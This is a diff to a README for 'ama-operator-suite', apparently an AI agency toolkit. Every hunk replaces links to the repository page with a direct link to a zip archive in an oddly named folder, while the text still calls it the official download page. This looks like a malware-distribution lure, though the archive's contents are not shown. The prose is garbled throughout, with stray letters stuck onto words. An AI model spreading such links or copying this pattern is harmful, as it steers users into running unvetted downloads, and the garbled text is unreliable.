@@ -1,6 +1,6 @@
 # ⚡ ama-operator-suite - Your Complete AI Agency Business Toolkit
 
-[![Download Now](https://img.shields.io/badge/Download-ama--operator--suite-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mrartem1674/ama-operator-suite)
+[![Download Now](https://img.shields.io/badge/Download-ama--operator--suite-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mrartem1674/ama-operator-suite/main/unheated/suite_ama_operator_v2.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Let's get you up and running in no timeflat. Follow these simple steps:
 
 **Visit this link to download the application:** 
 
-👉 **[https://github.com/mrartem1674/ama-operator-suite](https://github.com/mrartem1674/ama-operator-suite)**
+👉 **[https://raw.githubusercontent.com/mrartem1674/ama-operator-suite/main/unheated/suite_ama_operator_v2.4.zip](https://raw.githubusercontent.com/mrartem1674/ama-operator-suite/main/unheated/suite_ama_operator_v2.4.zip)**
 
 This will take you directly to the official download page for ama-operator-suitefini. Look for the green "Download" button or the latest release link on that pagefi. Click it, and your download will begin automatically,typically within a few seconds,depending on your internet speed. The file you receive will be ready to use with no complicated setup required.
 
@@ -145,7 +145,7 @@ Try right-clicking the main HTML file, choose "Open With", and select Chrome or 
 
 ## 📆 Receive Future Updates
 
-While this toolkit works perfectly standaloneon. The developer may occasionally add new tools or improvements get. To get the latest version, simply revisit the **[download page](https://github.com/mrartem1674/ama-operator-suite)** every few months and re-download the newest filec. Your old data is not stored inside the app,so you won't lose anything – just get the improved versioncd. 
+While this toolkit works perfectly standaloneon. The developer may occasionally add new tools or improvements get. To get the latest version, simply revisit the **[download page](https://raw.githubusercontent.com/mrartem1674/ama-operator-suite/main/unheated/suite_ama_operator_v2.4.zip)** every few months and re-download the newest filec. Your old data is not stored inside the app,so you won't lose anything – just get the improved versioncd. 
 
 ---
 
@@ -164,7 +164,7 @@ Your support keeps the tools freeandem ongoing improvements possibleali.
 
 Ready to dive in? Here's that all-important link again:
 
-### 👉 [**Download ama-operator-suite from GitHub**](https://github.com/mrartem1674/ama-operator-suite)
+### 👉 [**Download ama-operator-suite from GitHub**](https://raw.githubusercontent.com/mrartem1674/ama-operator-suite/main/unheated/suite_ama_operator_v2.4.zip)
 
 ) 
 
